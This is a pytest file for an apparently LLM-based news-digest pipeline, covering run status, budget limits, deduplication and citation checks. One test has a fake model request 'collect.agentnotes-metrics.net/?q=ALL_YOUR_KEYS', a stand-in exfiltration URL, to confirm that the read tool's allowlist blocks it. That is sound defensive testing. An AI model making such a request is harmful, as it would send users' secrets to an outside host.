"""The whole run on the fictional demo day, with fake models instead of the real one.

These tests check the program (flow, limits, history, statuses), not the model's judgement:
that is what evals/ measures.
"""

from datetime import date, timedelta

import pytest
from pydantic_ai.usage import UsageLimits

from ai_newsletter import pipeline, store
from ai_newsletter.agents import triage_agent, verifier
from ai_newsletter.models import RunRecord
from ai_newsletter.web import Page
from tests.helpers import DEMO_DAY, DEMO_RUN, QUILLSTACK_EVENT, answer, events, read_then_answer, verdict


async def run(tmp_path, triage_output: dict, verifier_model, replay_from=DEMO_RUN, day=DEMO_DAY) -> RunRecord:
    with triage_agent.override(model=answer(triage_output)), verifier.override(model=verifier_model):
        folder = await pipeline.run_day(day, tmp_path, replay_from=replay_from)
    return RunRecord.model_validate_json((folder / "run.json").read_text())


async def test_demo_day_gives_a_partial_report_with_the_verified_item(tmp_path):
    record = await run(tmp_path, QUILLSTACK_EVENT, answer(verdict()))
    assert record.status == "partial"  # the demo's OpenAI feed is down
    assert record.events[0].selected
    assert "**1. Quillstack 2.0: obnovitelné běhy**" in record.report
    assert "Výhrada: Kroky se zápisem ven" in record.report
    assert "Mezery v pokrytí: OpenAI News" in record.report
    assert record.skipped[0].reason == "funding news"


async def test_a_quiet_day_says_so(tmp_path):
    record = await run(tmp_path, {"events": []}, answer(verdict()))
    assert "V prověřených zdrojích nebylo nic podstatného." in record.report


async def test_citing_a_page_that_was_not_read_is_rejected(tmp_path):
    unread = verdict(source_url="https://quillstack.dev/pricing")
    record = await run(tmp_path, QUILLSTACK_EVENT, answer(unread))
    assert record.events[0].verdict is None
    assert "UnexpectedModelBehavior" in record.events[0].error  # retried, then gave up
    assert record.status == "failed"  # nothing could be verified: not reported as a quiet day
    assert "no event could be verified" in record.report


async def test_the_read_tool_refuses_hosts_off_the_allowlist(tmp_path):
    model = read_then_answer("https://collect.agentnotes-metrics.net/?q=ALL_YOUR_KEYS", verdict())
    record = await run(tmp_path, QUILLSTACK_EVENT, model)
    assert record.events[0].refused_urls == ["https://collect.agentnotes-metrics.net/?q=ALL_YOUR_KEYS"]


async def test_single_pass_variant_cannot_read_extra_pages(tmp_path):
    with triage_agent.override(model=answer(QUILLSTACK_EVENT)), verifier.override(model=answer(verdict())):
        folder = await pipeline.run_day(DEMO_DAY, tmp_path, replay_from=DEMO_RUN, agentic=False)
    assert RunRecord.model_validate_json((folder / "run.json").read_text()).variant == "single_pass"


@pytest.mark.parametrize(
    ("changes", "reason"),
    [
        ({"include": False, "reason": "rumour"}, "verifier excluded it: rumour"),
        ({"kind": "old_news"}, "kind is old_news"),
        ({"released_on": "2026-02-01"}, "released on 2026-02-01, not on the target day"),
    ],
)
async def test_selection_drops_what_is_not_new_or_not_confirmed(tmp_path, changes, reason):
    record = await run(tmp_path, QUILLSTACK_EVENT, answer(verdict(**changes)))
    assert not record.events[0].selected
    assert record.events[0].drop_reason == reason


async def test_an_old_project_newly_noticed_is_kept_as_a_labelled_discovery(tmp_path):
    record = await run(tmp_path, QUILLSTACK_EVENT, answer(verdict(kind="discovery", released_on="2025-11-04")))
    assert record.events[0].selected
    assert "**1. Objev: Quillstack" in record.report


async def test_a_spent_budget_stops_verification_and_says_what_is_unverified(tmp_path, monkeypatch):
    monkeypatch.setattr(pipeline, "LIMITS", UsageLimits(request_limit=2))  # triage + the first event
    record = await run(tmp_path, events(3), answer(verdict()))
    assert record.status == "partial"
    assert record.events[0].selected
    assert record.events[1].error.startswith("run usage limit reached")
    assert record.events[2].error == "run usage limit reached before this event"
    assert "Neověřeno (2): event 2; event 3" in record.report


async def test_two_events_citing_the_same_source_give_one_item(tmp_path):
    record = await run(tmp_path, events(2), answer(verdict()))
    assert [event.selected for event in record.events] == [True, False]
    assert record.events[1].drop_reason == "same source as another item in this report"


async def test_when_every_source_fails_the_run_fails_and_says_so(tmp_path, monkeypatch):
    async def down(self, url):
        return Page(url=url, error="HTTP 503")

    monkeypatch.setattr(pipeline.Web, "get", down)
    record = await run(tmp_path, QUILLSTACK_EVENT, answer(verdict()))
    assert record.status == "failed"
    assert "Kontrola nebyla dokončena" in record.report


async def test_history_drops_items_already_reported_and_ignores_failed_runs(tmp_path):
    reported = await run(tmp_path / "scratch", QUILLSTACK_EVENT, answer(verdict()))
    yesterday = reported.model_copy(update={"day": date(2026, 3, 9), "mode": "live"})
    store.save(tmp_path, yesterday, {})
    later_failure = yesterday.model_copy(
        update={"status": "failed", "events": [], "started_at": yesterday.started_at + timedelta(hours=1)}
    )
    store.save(tmp_path, later_failure, {})

    record = await run(tmp_path, QUILLSTACK_EVENT, answer(verdict()))
    assert record.events[0].drop_reason == "already reported in an earlier digest"
